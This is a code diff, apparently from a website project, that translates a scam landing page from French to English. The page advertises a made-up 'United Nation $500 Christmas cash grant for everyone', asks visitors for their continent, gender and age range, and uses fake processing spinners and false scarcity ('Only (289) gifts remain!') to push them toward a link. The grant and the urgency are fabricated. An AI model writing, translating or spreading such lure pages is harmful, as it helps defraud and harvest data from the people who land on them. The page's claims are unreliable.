@@ -343,12 +343,12 @@ D'accord
 <a href="https://www.xmas-season.xyz/500dollar-grant"><b><font color="red">FRENCH</font></b></a> | <a href="https://www.xmas-season.xyz/500dollar-grant"><b><font color="green">ENGLISH</font></b></a>
   <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjkInameNo4oDX_03Gq-LPljVsMUpMXfNCUiyUpmlg0j_wdNsHPWG1W1vhxYbu8SGYa8pMAs_NOBBo9pZboEz1BJ9-GxyaI09WrGdlWFGkGuAxO85iWWCHycVF0eyUMNiWxUos_yCBYgTgwaEGweBEGX1HnqwaBNnodj4VYITvq8RtwP-rMi3J93Yjz2t42/s3072/CA8F25E6-AD8F-4745-AA87-5F4269CD3D7E.jpeg" style="width:100%;" />
 <h1 class="heading heading--h1">
-Bonjour!
+Hello!
 </h1>
   <p class="paragraph">
-Bienvenue a, <b>SUBVENTION DE NOeL DE $500 DES NATIONS UNIES POUR TOUS</b>, pour celebrer Noel cette annee, LA NATION UNIE distribue une subvention en espèces de $500 a tout le monde.
+Welcome to, <b>THE UNITED NATION $500 CHRISTMAS CASH GRANT FOR EVERYONE</b>, in celebration of this year christmas THE UNITED NATION is giving out $500 cash grant to Everyone.
 <br>
-Repondez aux questions ci-dessous pour reclamer <b>Prix ​​en argent de $500</b>
+Answer the questions below to claim <b>$500 Cash Prize</b>
 </p>
   <br>
 </div>
@@ -358,59 +358,61 @@ Repondez aux questions ci-dessous pour reclamer <b>Prix ​​en argent de $500<
 
 <div class="verify" v-if="showRotator">
 <vue-text-rotator v-on:rotate="rotate" v-on:finished="onRotatorFinished" :strings='[
-                     "Sil vous plaît, attendez un moment...",
-              "Sil vous plaît, attendez un moment...",
-              "Sil vous plaît, attendez un moment..."
+                     "Please wait a moment...",
+              "Please wait a moment...",
+              "Please wait a moment..."
             ]'>
 </vue-text-rotator>
 <div class="verify__text" v-if="rotateIndex > 1">
 <strong>
-Vous avez repondu a 4/4 des questions</strong>
-<img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
-</div>
-<div class="verify__text" v-else>
-Vos reponses sont en cours de traitement<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 0}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
-</div>
-<div class="verify__text" v-if="rotateIndex > 2">
-<strong>
-encore des prix disponibles </strong>
-<img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
-</div>
-<div class="verify__text" v-else>
-a la recherche de cadeaux.. 
-<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 1}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
-</div>
-<div class="verify__text" v-if="rotateIndex > 3">
-<strong>
-ll ne reste que (289) cadeaux
+You have answered 4/4 of the questions
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Le stock est en cours de verification
+Your answers are being processed
+<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 0}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
+</div>
+<div class="verify__text" v-if="rotateIndex > 2">
+<strong>
+still prizes available!
+</strong>
+<img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
+</div>
+<div class="verify__text" v-else>
+Looking for gifts.. 
+<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 1}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
+</div>
+<div class="verify__text" v-if="rotateIndex > 3">
+<strong>
+Only (289) gifts remain!
+</strong>
+<img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
+</div>
+<div class="verify__text" v-else>
+Stock is being checked
 <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 2 }" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 </div>
 <vue-survey v-if="showSurvey" :show-steps="true" :questions='[
             {
-              title: "Choisissez votre continent",
+              title: "Choose your continent",
               answers: [ { text: "African" }, { text: "European" } ]
             },
                                                              {
-              title: "Fetez-vous Noel dans votre pays ?",
+              title: "Do you celebrate christmas in your country?",
               answers: [ { text: "Yes" }, { text: "No" } ]
             },
             {
-              title: "Choisissez votre sexe ?",
+              title: "Choose your Gender?",
               answers: [ { text: "Male" }, { text: "Female" } ]
             },
             {
-              title: "Selectionnez votre tranche d'âge ?",
+              title: "Select Your Age Range?",
               answers: [ { text: "18 - 20years" }, { text: "21 - 25years" }, { text: "26 - 30 years" }, { text: "30years Above" } ]
             },
           ]' v-on:finish="onSurveyFinish"></vue-survey>
 </div>
-
        <br> <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiNLqIIVDeSyrDzhpv2qsYpVeZAITRneSBrxgdiSe4cl9CSy5XNxjgBSAmo-09WAV0K_g1j9tcUivv5TSCNFv3oeZDINMBtu1DKXiJHrw1q7ssFVMaRQtmRGTpd6X_H04Sb553lTKGHvTIoOiYk1bmW9UJCukpPQJymU_U4DPEqpBg-yjclLIKPuG7DCz8/s600/WhatsApp%20Image%202024-10-08%20at%2022.13.46%20%281%29.jpeg" style="width:100%;" />
   </div>
       </div>
